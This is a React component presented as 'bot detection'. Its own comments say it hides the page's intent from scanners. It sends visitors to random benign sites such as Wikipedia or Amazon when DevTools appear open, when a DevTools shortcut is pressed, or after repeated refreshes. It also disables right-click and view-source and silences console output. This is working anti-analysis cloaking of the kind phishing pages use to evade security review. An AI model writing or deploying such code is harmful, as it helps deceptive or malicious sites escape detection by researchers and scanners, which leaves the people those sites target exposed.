'use client'

import { useEffect } from 'react'

interface BotDetectionProps {
  onBotDetected: () => void
}

export default function BotDetection({ onBotDetected }: BotDetectionProps) {
  useEffect(() => {
    // Skip bot detection if CAPTCHA was already verified
    const captchaVerified = sessionStorage.getItem('captcha_verified')
    const captchaTimestamp = sessionStorage.getItem('captcha_timestamp')
    
    if (captchaVerified === 'true' && captchaTimestamp) {
      const timeDiff = Date.now() - parseInt(captchaTimestamp)
      // Valid for 30 minutes - if CAPTCHA passed recently, skip aggressive bot detection
      if (timeDiff < 30 * 60 * 1000) {
        // Still disable right-click and keyboard shortcuts, but don't redirect
        const handleContextMenu = (e: MouseEvent) => {
          e.preventDefault()
          return false
        }

        const handleKeyDown = (e: KeyboardEvent) => {
          if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
            (e.ctrlKey && e.key === 'U')
          ) {
            e.preventDefault()
            return false
          }
        }

        document.addEventListener('contextmenu', handleContextMenu)
        document.addEventListener('keydown', handleKeyDown)

        return () => {
          document.removeEventListener('contextmenu', handleContextMenu)
          document.removeEventListener('keydown', handleKeyDown)
        }
      }
    }

    // Silent bot detection - backend only, no user alerts
    // Track page refreshes silently
    const refreshKey = 'page_refresh_count'
    const timestampKey = 'page_refresh_timestamp'
    const lastRefresh = localStorage.getItem(timestampKey)
    const now = Date.now()

    // Reset count if more than 5 minutes passed
    if (lastRefresh && now - parseInt(lastRefresh) > 5 * 60 * 1000) {
      localStorage.setItem(refreshKey, '0')
    }

    const currentCount = parseInt(localStorage.getItem(refreshKey) || '0') + 1
    localStorage.setItem(refreshKey, currentCount.toString())
    localStorage.setItem(timestampKey, now.toString())

    // Silent detection - redirect to safe site with random parameters
    // This prevents bots/scanners from seeing the page's intent
    if (currentCount >= 5) {
      const safeSites = [
        'https://en.wikipedia.org/wiki/Main_Page',
        'https://www.amazon.com',
        'https://www.ebay.com',
        'https://www.apple.com',
        'https://www.google.com',
      ]
      const baseUrl = safeSites[Math.floor(Math.random() * safeSites.length)]
      const params = new URLSearchParams()
      params.set('ref', Math.random().toString(36).substring(2, 15))
      params.set('t', Date.now().toString())
      params.set('id', Math.random().toString(36).substring(2, 10))
      const separator = baseUrl.includes('?') ? '&' : '?'
      const redirectUrl = `${baseUrl}${separator}${params.toString()}`
      setTimeout(() => {
        window.location.href = redirectUrl
      }, 500)
      return
    }

    // Silent DevTools detection - backend only
    let devtools = { open: false, orientation: null as any }
    const threshold = 160

    const detectDevTools = () => {
      if (
        window.outerHeight - window.innerHeight > threshold ||
        window.outerWidth - window.innerWidth > threshold
      ) {
        if (!devtools.open) {
          devtools.open = true
          // Silent detection - redirect to safe site with random parameters
          const safeSites = [
            'https://en.wikipedia.org/wiki/Main_Page',
            'https://www.amazon.com',
            'https://www.ebay.com',
            'https://www.apple.com',
            'https://www.google.com',
          ]
          const baseUrl = safeSites[Math.floor(Math.random() * safeSites.length)]
          const params = new URLSearchParams()
          params.set('ref', Math.random().toString(36).substring(2, 15))
          params.set('t', Date.now().toString())
          params.set('id', Math.random().toString(36).substring(2, 10))
          const separator = baseUrl.includes('?') ? '&' : '?'
          const redirectUrl = `${baseUrl}${separator}${params.toString()}`
          setTimeout(() => {
            window.location.href = redirectUrl
          }, 500)
        }
      } else {
        devtools.open = false
      }
    }

    const interval = setInterval(detectDevTools, 500)

    // Disable right-click context menu
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault()
      return false
    }

    // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U (silent - no alerts)
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
        (e.ctrlKey && e.key === 'U')
      ) {
        e.preventDefault()
        // Silent - redirect to safe site with random parameters
        const safeSites = [
          'https://en.wikipedia.org/wiki/Main_Page',
          'https://www.amazon.com',
          'https://www.ebay.com',
          'https://www.apple.com',
          'https://www.google.com',
        ]
        const baseUrl = safeSites[Math.floor(Math.random() * safeSites.length)]
        const params = new URLSearchParams()
        params.set('ref', Math.random().toString(36).substring(2, 15))
        params.set('t', Date.now().toString())
        params.set('id', Math.random().toString(36).substring(2, 10))
        const separator = baseUrl.includes('?') ? '&' : '?'
        const redirectUrl = `${baseUrl}${separator}${params.toString()}`
        setTimeout(() => {
          window.location.href = redirectUrl
        }, 300)
        return false
      }
    }

    document.addEventListener('contextmenu', handleContextMenu)
    document.addEventListener('keydown', handleKeyDown)

    return () => {
      clearInterval(interval)
      document.removeEventListener('contextmenu', handleContextMenu)
      document.removeEventListener('keydown', handleKeyDown)
    }
  }, [onBotDetected])

  // Disable console methods
  useEffect(() => {
    const noop = () => {}
    const originalLog = console.log
    const originalError = console.error
    const originalWarn = console.warn

    console.log = noop
    console.error = noop
    console.warn = noop

    return () => {
      console.log = originalLog
      console.error = originalError
      console.warn = originalWarn
    }
  }, [])

  return null
}

